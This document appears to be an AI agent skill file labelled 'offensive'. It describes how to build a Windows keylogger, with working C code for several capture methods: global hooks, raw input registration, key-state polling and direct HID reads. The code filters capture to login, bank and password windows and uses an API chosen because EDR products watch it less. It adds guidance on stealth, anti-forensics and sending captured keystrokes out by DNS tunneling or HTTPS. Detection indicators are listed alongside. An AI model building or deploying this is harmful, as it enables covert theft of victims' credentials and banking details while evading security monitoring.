---
name: keylogger-architecture
description: Low-level keylogger architecture — SetWindowsHookEx, raw input devices, ETW-based capture, kernel drivers, stealth techniques, IOC analysis
metadata:
  type: offensive
  phase: research
  ---

# Keylogger Architecture

## When to Activate

- Understanding input capture mechanisms for red team implants
- Analyzing malware keylogging capabilities
- EDR evasion research for input monitoring
- Designing stealthy credential capture

## Method 1: SetWindowsHookEx (WH_KEYBOARD_LL)

### How It Works

```c
// Install global low-level keyboard hook
HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            LogKey(kb->vkCode);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// MUST pump messages — hook won't fire without message loop
MSG msg;
while (GetMessage(&msg, NULL, 0, 0)) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
}
```

### Internal Mechanism

1. `SetWindowsHookEx` → `NtUserSetWindowsHookEx` in win32k.sys
2. Kernel creates HOOK structure, inserts at head of global hook chain
3. **Low-level hooks (WH_KEYBOARD_LL)**: NO DLL injection — events delivered via internal message to installing process
4. **Regular hooks (WH_KEYBOARD)**: DLL injected into every target process via APC

### IOCs
- Hook entry visible in `!hook` WinDbg command
- Installing thread must pump messages (detectable by message queue footprint)
- If regular hook: mapped DLL in every hooked process (VAD artifact)
- EDR can hook `user32!SetWindowsHookEx` to detect installation

## Method 2: RegisterRawInputDevices

### How It Works

```c
// Register for raw keyboard input — no hook chain, no DLL injection
RAWINPUTDEVICE rid;
rid.usUsagePage = 0x01;  // Generic Desktop
rid.usUsage = 0x06;      // Keyboard
rid.dwFlags = RIDEV_INPUTSINK;  // Receive input even when not foreground
rid.hwndTarget = hWnd;   // Message-only window

RegisterRawInputDevices(&rid, 1, sizeof(rid));

// In window procedure:
case WM_INPUT: {
    RAWINPUT raw;
    UINT size = sizeof(raw);
    GetRawInputData((HRAWINPUT)lParam, RID_INPUT, &raw, &size, sizeof(RAWINPUTHEADER));
    if (raw.header.dwType == RIM_TYPEKEYBOARD) {
        LogKey(raw.data.keyboard.VKey);
    }
}
```

### Advantages Over Hooks
- Does NOT appear in `!hook` list
- No cross-process DLL mapping
- Invisible to most EDR "hook chain" sensors
- No `CallNextHookEx` chain dependency

### IOCs
- **ETW event from kernel** (win32kfull.sys): `EtwTraceAuditApiRegisterRawInputDevices`
  - Contains PID, TID, UsagePage, Usage, Flags
  - Channel is ON by default, CANNOT be disabled without kernel patch
  - **This is the strongest IOC** — do not discount it
- Process must have window station and desktop
- Process must pump messages continuously

## Method 3: GetAsyncKeyState Polling

```c
// Simple but CPU-intensive — polls every key state
while (true) {
    for (int key = 0; key < 256; key++) {
        if (GetAsyncKeyState(key) & 0x0001) {  // Key was pressed since last check
            LogKey(key);
        }
    }
    Sleep(10);  // Reduce CPU usage
}
```

### IOCs
- High CPU usage from polling loop
- Detectable by API call frequency monitoring
- No kernel-level artifacts
- Least stealthy but simplest to implement

## Method 4: DirectInput / Raw HID Device

```c
// Open keyboard device directly (requires admin)
HANDLE hKeyboard = CreateFile(L"\\\\?\\HID#VID_xxxx&PID_xxxx",
    GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);

// Read HID reports directly — bypasses win32k entirely
ReadFile(hKeyboard, buffer, sizeof(buffer), &bytesRead, &overlapped);
// Parse HID keyboard report (8 bytes: modifier + reserved + 6 keycodes)
```

### IOCs
- Requires admin/SYSTEM privileges
- Creates IRP_MJ_READ telemetry on keyboard device
- Bypasses all userland monitoring
- Detectable by kernel-mode ETW or minifilter

## Method 5: ETW-Based Capture (Defensive Turned Offensive)

```c
// Subscribe to Microsoft-Windows-USB-UCX or HID ETW providers
// Capture raw USB HID events including keystrokes
// Requires admin but leaves minimal footprint

// Provider: Microsoft-Windows-USB-USBHUB3
// Events contain raw USB transfer data including HID reports
```

## Window Title Capture (Context Filtering)

### GetWindowTextA / GetForegroundWindow
```c
// Capture which application receives keystrokes
HWND fg = GetForegroundWindow();
char title[256];
GetWindowTextA(fg, title, sizeof(title));
// Filter: only log when title contains "login", "bank", "password"
```

### Stealthier: NtUserInternalGetWindowText
```c
// Lower-level, less hooked by EDRs
// Defined in win32u.dll, syscall into win32kfull.sys
typedef BOOL (WINAPI *pNtUserInternalGetWindowText)(HWND, LPWSTR, INT);
pNtUserInternalGetWindowText fn = GetProcAddress(GetModuleHandleA("win32u.dll"), "NtUserInternalGetWindowText");
WCHAR title[256];
fn(hWnd, title, 256);
```

## Stealth Techniques

### Memory-Only Operation
- Never write keystrokes to disk
- Buffer in encrypted memory, exfiltrate periodically
- Use sleep masking to encrypt buffer during idle

### Exfiltration Methods
- DNS tunneling (encode keystrokes in subdomain queries)
- HTTPS POST to legitimate-looking endpoint
- Append to legitimate application traffic (piggyback)
- Store in registry/ADS, retrieve separately

### Anti-Forensics
- Encrypt keystroke buffer with session key
- Overwrite buffer after exfiltration
- No persistent artifacts on disk
- Blend process name with legitimate software

## Detection Comparison

| Method | Stealth | Privileges | Primary IOC |
|--------|---------|-----------|-------------|
| SetWindowsHookEx (LL) | Low | User | Hook chain, message pump |
| SetWindowsHookEx (regular) | Very Low | User | DLL in every process |
| RegisterRawInputDevices | Medium | User | ETW kernel event |
| GetAsyncKeyState | Low | User | CPU usage, API frequency |
| Direct HID device | High | Admin | IRP telemetry |
| ETW-based | High | Admin | Provider subscription |
| Kernel driver | Very High | Admin/SYSTEM | Driver load event |
